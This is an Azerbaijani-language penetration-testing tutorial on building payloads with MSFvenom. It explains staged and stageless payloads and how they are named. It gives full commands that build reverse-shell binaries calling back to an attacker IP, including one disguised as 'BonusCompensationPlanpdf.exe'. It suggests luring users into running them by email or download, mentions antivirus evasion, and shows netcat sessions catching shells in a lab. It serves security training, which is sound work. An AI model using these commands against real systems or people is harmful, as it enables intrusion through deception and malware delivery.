## MSFvenom ilə Payloadların Hazırlanması

Biz Metasploit-də avtomatlaşdırılmış hücumlardan istifadə edərkən şəbəkə üzərindən zəif hədəf maşına çata bilməyimizə diqqət yetirməliyik. Əvvəlki bölmədə etdiklərimizə nəzər salın. **Exploit modulunu işə salmaq**, **payloadı çatdırmaq** və **shell seansını yaratmaq** üçün əvvəlcə sistemlə əlaqə qurmalı idik. Bu, daxili şəbəkədə və ya hədəfin yerləşdiyi şəbəkəyə marşrutları (routes) olan bir şəbəkədə mövcudluğumuz sayəsində mümkün ola bilər. Lakin, bəzən zəif hədəf maşına birbaşa şəbəkə girişimiz olmayan vəziyyətlər olacaq. Belə hallarda, payloadın sistemə necə çatdırılacağı və icra ediləcəyi barədə **yaradıcı** olmalıyıq. Belə yollardan biri **MSFvenom** istifadə edərək bir payload hazırlamaq və onu e-poçt mesajı və ya digər sosial mühəndislik vasitələri ilə istifadəçini faylı icra etməyə təşviq etmək ola bilər.

Çevik çatdırılma seçimləri olan bir payload təmin etməklə yanaşı, MSFvenom həm də ümumi anti-virus aşkarlama imzalarını keçmək üçün payloadları **şifrələməyə** və **kodlaşdırmağa** (encode) imkan verir. Gəlin bu konsepsiyalarla bir az məşq edək.

### MSFvenom ilə Təcrübə

Pwnbox-da və ya MSFvenom quraşdırılmış istənilən hostda, bütün mövcud payloadları siyahılaşdırmaq üçün `msfvenom -l payloads` əmrini verə bilərik. Aşağıda mövcud payloadlardan yalnız bəziləri göstərilmişdir. Əsas dərsdən yayınmamaq üçün bəzi payloadlar qısaldılmışdır. Payloadlara və onların təsvirlərinə yaxından nəzər salın:

#### Payloadların Siyahısı

```bash
nijatmansimov@htb[/htb]$ msfvenom -l payloads
Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
```

#### Çıxışda Nə Görürük?

Payloadları daha dərindən başa düşməyimizə kömək edəcək bir neçə detalı görə bilərik. Əvvəla, payload adlandırma konvensiyasının demək olar ki, həmişə hədəfin ƏS-ni (**Linux**, **Windows**, **MacOS**, **mainframe**, və s.) siyahılaşdırmaqla başladığını görürük. Həmçinin, bəzi payloadların **(staged)** (mərhələli) və ya **(stageless)** (mərhələsiz) kimi təsvir edildiyini görə bilərik. Gəlin fərqi öyrənək.

### Staged (Mərhələli) vs. Stageless (Mərhələsiz) Payloadlar

**Staged** payloadlar hücumumuzun daha çox komponentlərini göndərmək üçün bir yol yaradır. Bunu daha faydalı bir şey üçün "səhnə qurmaq" kimi düşünə bilərik. Məsələn, `linux/x86/shell/reverse_tcp` payloadını götürək. Metasploit-də bir exploit modulu istifadə edilərək işə salındıqda, bu payload hədəfdə icra olunacaq kiçik bir **mərhələ** (stage) göndərəcək və sonra şəbəkə üzərindən payloadın qalan hissəsini yükləmək üçün **hücum qutusuna** geri zəng edəcək, daha sonra **reverse shell** yaratmaq üçün shellcode-u icra edəcək. Əlbəttə, bu payloadı işə salmaq üçün Metasploit-dən istifadə etsək, listenerin shell-i uğurla tutması üçün düzgün IP-lərə və porta işarə etmək üçün seçimləri konfiqurasiya etməliyik. Unutmayın ki, bir mərhələ də yaddaşda yer tutur, bu da payload üçün daha az yer buraxır. Hər mərhələdə nə baş verdiyi payloaddan asılı olaraq dəyişə bilər.

**Stageless** payloadların bir mərhələsi yoxdur. Məsələn, `linux/zarch/meterpreter_reverse_tcp` payloadını götürək. Metasploit-də bir exploit modulu istifadə edərək, bu payload bir mərhələ olmadan bir şəbəkə bağlantısı üzərindən bütövlükdə göndəriləcək. Bu, zəif bant genişliyi olan və gecikmənin müdaxilə edə biləcəyi mühitlərdə bizim üçün faydalı ola bilər. Belə mühitlərdə mərhələli payloadlar qeyri-sabit shell seanslarına səbəb ola bilər, buna görə də mərhələsiz payload seçmək daha yaxşı olar. Bundan əlavə, mərhələsiz payloadlar bəzən yayındırma (evasion) məqsədləri üçün daha yaxşı ola bilər, çünki payloadı icra etmək üçün şəbəkə üzərindən daha az trafik keçir, xüsusən də sosial mühəndislikdən istifadə edərək onu çatdırsaq. Bu konsepsiya, Rapid 7 tərəfindən **mərhələsiz Meterpreter payloadları** haqqında bu bloq yazısında da çox yaxşı izah edilmişdir.

İndi staged və stageless payloadlar arasındakı fərqləri başa düşdüyümüzə görə, onları Metasploit daxilində müəyyən edə bilərik. Cavab sadədir. **Ad** sizə ilk göstəricini verəcək. Yuxarıdakı nümunələrimizi götürək, `linux/x86/shell/reverse_tcp` mərhələli payloaddır və biz bunu addan bilirik, çünki adındakı hər bir `/` shell-dən irəli bir mərhələni təmsil edir. Beləliklə, `/shell/` göndəriləcək bir mərhələdir və `/reverse_tcp` başqasıdır. Mərhələsiz payload üçün hamısı bir-birinə bitişik görünəcək. Məsələn, `linux/zarch/meterpreter_reverse_tcp` nümunəmizi götürək. O, staged payloada bənzəyir, lakin təsir etdiyi arxitekturanı göstərir, sonra shell payloadı və şəbəkə rabitəsi eyni funksiyada **`/meterpreter_reverse_tcp`** daxilindədir. Bu adlandırma konvensiyasının son bir qısa nümunəsi üçün bu ikisinə nəzər salın: `windows/meterpreter/reverse_tcp` və `windows/meterpreter_reverse_tcp`. Birincisi **Staged** payloaddır. Mərhələləri ayıran adlandırma konvensiyasına diqqət edin. İkincisi **Stageless** payloaddır, çünki shell payloadını və şəbəkə rabitəsini adın eyni hissəsində görürük. Əgər payloadın adı sizə tam aydın deyilsə, təsvirdə payloadın mərhələli və ya mərhələsiz olduğu adətən ətraflı göstərilir.

### Mərhələsiz Payload Hazırlamaq

İndi MSFvenom ilə sadə bir mərhələsiz payload hazırlayaq və əmri təhlil edək.

#### Hazırlamaq

```bash
nijatmansimov@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

| Hissə | Təsvir |
| :--- | :--- |
| **msfvenom** | Payloadı hazırlamaq üçün istifadə olunan aləti müəyyən edir. |
| **-p** | Bu **seçim** MSFvenom-un bir payload yaratdığını göstərir. |
| **linux/x64/shell\_reverse\_tcp** | **Linux** 64-bit **mərhələsiz** payloadı müəyyən edir ki, bu da TCP əsaslı reverse shell (shell\_reverse\_tcp) başladacaq. |
| **LHOST=10.10.14.113 LPORT=443** | İcra edildikdə, payload müəyyən edilmiş IP ünvanına (10.10.14.113) müəyyən edilmiş portda (443) geri zəng edəcək. |
| **-f elf** | `-f` bayrağı yaradılan ikilik faylın formatını müəyyən edir. Bu vəziyyətdə, bu bir **.elf faylı** olacaq. |
| **\> createbackup.elf** | **.elf** ikilik faylını yaradır və faylı `createbackup` adlandırır. Biz bu faylı istədiyimiz kimi adlandıra bilərik. İdeal olaraq, biz onu diqqəti cəlb etməyən və/və ya kiminsə yükləyib icra etmək istəyəcəyi bir şey adlandırarıq. |

#### Mərhələsiz Payloadın İcrası

Bu məqamda, payload hücum qutumuzda yaradılıb. İndi o payloadı hədəf sisteminə çatdırmaq üçün bir yol inkişaf etdirməliyik. Bunun edilə biləcəyi saysız-hesabsız yollar var. Budur bəzi ümumi yollar:

  * Fayl əlavə edilmiş **e-poçt mesajı**.
  * Veb saytda **yükləmə linki**.
  * Bir Metasploit exploit modulu ilə birləşdirilmiş (bunun üçün yəqin ki, artıq daxili şəbəkədə olmalıyıq).
  * Yerində (onsite) penetrasiya testinin bir hissəsi olaraq **flash drive** vasitəsilə.

Fayl o sistemdə olduqdan sonra, o da **icra edilməlidir**.

Bir anlıq təsəvvür edin: hədəf maşın, bir İT administratorunun şəbəkə cihazlarını idarə etmək üçün istifadə etdiyi (konfiqurasiya skriptlərini hosting etmək, routerlərə və switchlərə daxil olmaq və s.) bir Ubuntu qutusudur. Biz onlara göndərdiyimiz bir e-poçtda fayla klikləməyə nail ola bilərik, çünki onlar bu sistemi ehtiyatsızcasına şəxsi kompüter və ya iş stansiyası kimi istifadə edirdilər.

#### Ubuntu Payloadı

Uğurlu icra edildikdən sonra hücum qutusunda bağlantını tutmaq üçün bir listenerimiz hazır olacaq.

<img width="1024" height="668" alt="image" src="https://github.com/user-attachments/assets/33a7ad9b-c802-4576-b12d-4d3be41213f8" />

#### NC Bağlantısı

```bash
nijatmansimov@htb[/htb]$ sudo nc -lvnp 443
```

Fayl icra edildikdə, bir shell tutduğumuzu görürük.

#### Bağlantı Quruldu

```bash
nijatmansimov@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

Eyni konsepsiya Windows daxil olmaqla müxtəlif platformalar üçün payload yaratmaq üçün istifadə edilə bilər.

### Windows Sistemi üçün Sadə Mərhələsiz Payload Hazırlamaq

Biz həmçinin Windows sistemində işə salına bilən və shell təmin edən bir icra edilə bilən (.exe) fayl hazırlamaq üçün MSFvenom-dan istifadə edə bilərik.

#### Windows Payloadı

```bash
nijatmansimov@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Əmr sintaksisi yuxarıda etdiyimiz kimi təhlil edilə bilər. Yeganə fərqlər, əlbəttə ki, payloadın **platforması** (Windows) və **formatıdır** (.exe).

### Windows Sistemində Sadə Mərhələsiz Payloadın İcrası

Bu, bu payloadı hədəf sisteminə çatdırmaq üçün yaradıcı olmalı olduğumuz başqa bir vəziyyətdir. Heç bir **kodlaşdırma** və ya **şifrələmə** olmadan, bu formada payload demək olar ki, mütləq Windows Defender AV tərəfindən aşkar ediləcək.

<img width="1025" height="687" alt="image" src="https://github.com/user-attachments/assets/8d702423-98f4-4b65-be08-c4168a3ad28f" />

Əgər AV deaktiv edilsəydi, istifadəçinin edəcəyi tək şey faylı icra etmək üçün iki dəfə klikləmək olardı və bizim bir shell seansımız olardı.

```bash
nijatmansimov@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```
